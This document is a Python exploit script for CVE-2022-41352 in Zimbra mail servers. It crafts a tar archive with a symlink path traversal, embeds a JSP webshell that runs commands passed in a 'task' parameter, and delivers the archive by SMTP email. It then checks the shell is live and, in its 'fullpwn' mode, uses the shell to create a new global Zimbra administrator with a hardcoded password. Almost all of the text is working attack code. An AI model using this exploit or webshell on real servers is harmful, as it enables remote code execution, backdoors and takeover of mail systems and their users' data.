#!/usr/bin/env python3

import sys
import smtplib
from time import sleep
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from email.mime.text import MIMEText
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# CONFIGURATION
#----------------------------------
TARGET		= 'mail.test.org'
UPLOAD_BASE	= '/opt/zimbra/jetty_base/webapps/zimbra'
WEBSHELL_PATH 	= '/public/jsp'
WEBSHELL_NAME 	= 'Startup1_3.jsp'
ATTACHMENT	= 'payload.tar'
SENDER		= 'test@test.org'
RECIPIENT	= 'admin@test.org'

EMAIL_SUBJECT	= 'CVE-2022-41352'
EMAIL_BODY	= '<b>Just testing.</b><br><p>Don\'t mind me.</p>'
#----------------------------------

def create_tar_payload(payload, payload_name, payload_path, lnk='startup'):
	# Block 1
	link = lnk.encode()
	mode = b'0000777\x00'		# link permissions
	ouid = b'0001745\x00'		# octal uid (997)
	ogid = b'0001745\x00'		# octal gid
	lnsz = b'00000000000\x00'	# file size (link = 0)
	lmod = b'14227770134\x00'       # last modified (octal unix)
	csum = b'        '		# checksum = 8 blanks
	type = b'2'			# type (link = 2)
	targ = payload_path.encode()	# link target
	magi = b'ustar  \x00'		# ustar magic bytes + version
	ownu = b'zimbra'		# user owner
	owng = b'zimbra'		# group owner
	vers = b'\x00'*8 + b'\x00'* 8	# device major and minor
	pref = b'\x00'*155		# prefix (only used if the file name length exceeds 100)

	raw_b1_1 = link + b'\x00'*(100-len(link)) + mode + ouid + ogid + lnsz + lmod
	raw_b1_2 = type + targ + b'\x00'*(100-len(targ)) + magi + ownu + b'\x00'*(32-len(ownu)) + owng + b'\x00'*(32-len(owng)) + vers + pref
	# calculate and insert checksum
	csum = oct(sum(b for b in raw_b1_1+csum+raw_b1_2))[2:]
	raw_b1 = raw_b1_1 + f'{csum:>07}'.encode() + b'\x00' + raw_b1_2
	# pad block to 512
	raw_b1 += b'\00'*(512-len(raw_b1))

	# Block 2
	mode = b'0000644\x00'		# file permissions
	file = f'{lnk}/{payload_name}'.encode()
	flsz = oct(len(payload))[2:]	# file size
	csum = b'        '		# checksum = 8 blanks
	type = b'0'			# type (file = 0)
	targ = b'\x00'*100		# link target = none

	raw_b2_1 = file + b'\x00'*(100-len(file)) + mode + ouid + ogid + f'{flsz:>011}'.encode() + b'\x00' + lmod
	raw_b2_2 = type + targ + magi + ownu + b'\x00'*(32-len(ownu)) + owng + b'\x00'*(32-len(owng)) + vers + pref
	# calculate and insert checksum
	csum = oct(sum(b for b in raw_b2_1+csum+raw_b2_2))[2:]
	raw_b2 = raw_b2_1 + f'{csum:>07}'.encode() + b'\x00' + raw_b2_2
	# pad block to 512
	raw_b2 += b'\00'*(512-len(raw_b2))


	# Assemble
	raw_tar = raw_b1 + raw_b2 + payload + b'\x00'*(512-(len(payload)%512))
	raw_tar += b'\x00' * 512 * 2 # Trailer: end with 2 empty blocks

	print(f'>>> Assembled payload')

	return raw_tar

def smtp_send_file(target, sender, recipient, subject, body, attachment, attachment_name):
	msg = MIMEMultipart()
	msg['Subject'] = subject
	msg['From'] = sender
	msg['To'] = recipient

	message = MIMEText(body, 'html')
	msg.attach(message)

	att = MIMEApplication(attachment)
	att.add_header('Content-Disposition', 'attachment', filename=attachment_name)
	msg.attach(att)

	try:
		print(f'>>> Sending payload')
		smtp_server = smtplib.SMTP(target,25)
		smtp_server.sendmail(sender, recipient, msg.as_string())
		print(f'>>> Payload delivered')
	except Exception as e:
		print(f'[!] Failed to send the mail: {e}')
		sys.exit(1)

def verify_upload(target, shell, path):
	print(f'>>> Verifying upload to {path}/{shell} ...')
	sleep(5) # give the server time to process the email
	resp = requests.get(f'https://{target}{path}/{shell}', verify=False)
	if resp.status_code == 200:
		print(f'>>> [PWNED] Upload successful!')
	else:
		print(f'>>> Upload unsuccesful :(')
		sys.exit(1)

def create_new_zimbra_admin(target, shell, path):
	url = f'https://{target}'
	pw = 'Pwn1ng_Z1mbra_!s_fun'
	print(f'>>> Adding a new global administrator')
	if (input(f'>>> Are you sure you want to continue? (yN): ') != 'y'):
		sys.exit(0)
	admin = input(f'>>> Enter the new admin email (newadmin@domain.com): ')
	r = requests.get(f'{url}/{path}/{shell}?task=/opt/zimbra/bin/zmprov ca {admin} {pw}', verify=False)
	r = requests.get(f'{url}/{path}/{shell}?task=/opt/zimbra/bin/zmprov ma {admin} zimbraIsAdminAccount TRUE', verify=False)

	print(f'>>> Login to {url}:7071/zimbraAdmin/ with:')
	print(f'>>>     Email    : {admin}')
	print(f'>>>     Password : {pw}')


def main(mode):

	# Kali JSP WebShell
	webshell  = b'<FORM METHOD=GET ACTION="'
	webshell += WEBSHELL_NAME.encode()
	webshell += b'"><INPUT name="task" type=text><INPUT type=submit value="Run"></FORM><%@ page import="java.io.*" %><% String cmd=request.getParameter("task");String output="";if(cmd!=null){String s=null;try {Process p=Runtime.getRuntime().exec(cmd);BufferedReader sI=new BufferedReader(new InputStreamReader(p.getInputStream()));while((s = sI.readLine())!=null){output+=s;}}catch(IOException e){e.printStackTrace();}} %><pre><%=output %></pre>'

	tar = create_tar_payload(webshell, WEBSHELL_NAME, UPLOAD_BASE+WEBSHELL_PATH)

	if mode == 'manual':
		with open(ATTACHMENT, 'wb') as f:
			f.write(tar)
		print(f'>>> Dumped payload to {ATTACHMENT}')
		sys.exit(0)

	print(f'>>> Targeting {TARGET}')

	smtp_send_file(	TARGET,
			SENDER,
			RECIPIENT,
			EMAIL_SUBJECT,
			EMAIL_BODY,
			tar,
			ATTACHMENT )

	requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

	verify_upload(TARGET, WEBSHELL_NAME, WEBSHELL_PATH)

	if mode == 'auto':
		print(f'>>> Shell at: https://{TARGET}{WEBSHELL_PATH}/{WEBSHELL_NAME}')
		sys.exit(0)

	create_new_zimbra_admin(TARGET, WEBSHELL_NAME, WEBSHELL_PATH)

	sys.exit(0)

if __name__ == '__main__':
	modes = ['manual', 'auto', 'fullpwn']
	if len(sys.argv) != 2 or sys.argv[1] not in modes:
		print(f' Usage: {sys.argv[0]} <mode>')
		print()
		print(f' Where <mode> is one of:')
		print(f'     manual : Only create the payload - you have to deploy the payload yourself.')
		print(f'       auto : Create a webshell and deploy it via SMTP.')
		print(f'    fullpwn : After deploying a webshell, add a new global mail administrator.')
		print()
		print(f' Edit the script to change the target and other options.')
		sys.exit(1)
	main(sys.argv[1])
